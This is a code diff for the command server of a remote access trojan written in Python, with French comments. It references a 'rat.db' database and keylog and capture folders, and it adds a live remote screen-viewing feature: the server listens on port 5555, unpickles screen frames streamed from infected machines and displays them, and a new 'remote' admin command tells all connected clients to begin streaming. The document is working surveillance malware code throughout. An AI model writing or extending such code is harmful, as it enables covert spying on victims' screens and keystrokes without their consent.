@@ -4,12 +4,59 @@ import sqlite3
 from datetime import datetime
 import os
 import json
+import struct
+import pickle
+from PIL import Image
+import io
+import cv2
+import numpy as np
+import time
+
 
 SERVER_HOST = '0.0.0.0'
 SERVER_PORT = 4444
 DB_PATH = "../bdd/rat.db"
 KEYLOG_DIR = "keylogs"
 CAPTURE_DIR = "captures"
+
+
+REMOTE_PORT = 5555
+
+
+def remote_view():
+    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    remote_socket.bind((SERVER_HOST, REMOTE_PORT))
+    remote_socket.listen(1)
+    print("[*] Remote stream en attente de connexion...")
+
+    conn, addr = remote_socket.accept()
+    print(f"[+] Remote stream connecté : {addr}")
+
+    try:
+        while True:
+            raw_size = conn.recv(4)
+            if not raw_size:
+                break
+            size = struct.unpack("!I", raw_size)[0]
+            data = b""
+            while len(data) < size:
+                packet = conn.recv(size - len(data))
+                if not packet:
+                    break
+                data += packet
+            frame_data = pickle.loads(data)
+            width, height = frame_data['size']
+            rgb = frame_data['rgb']
+            frame_np = np.frombuffer(rgb, dtype=np.uint8).reshape((height, width, 3))
+            cv2.imshow("REMOTE ACCESS LIVE", frame_np)
+            if cv2.waitKey(1) & 0xFF == ord('q'):
+                break
+    except Exception as e:
+        print(f"[!] Remote error: {e}")
+    finally:
+        conn.close()
+        remote_socket.close()
+        cv2.destroyAllWindows()
 
 # Création des dossiers nécessaires
 os.makedirs(KEYLOG_DIR, exist_ok=True)
@@ -99,6 +146,13 @@ try:
         command = input("Admin > ").strip()
         if command == "exit":
             break
+
+        elif command == "remote":
+            threading.Thread(target=remote_view, daemon=True).start()
+            time.sleep(1.5)  # Attendre lecoute du port 5555
+            for client in clients.values():
+                client.send(command.encode('utf-8'))
+
         elif command:
             for client in clients.values():
                 client.send(command.encode('utf-8'))
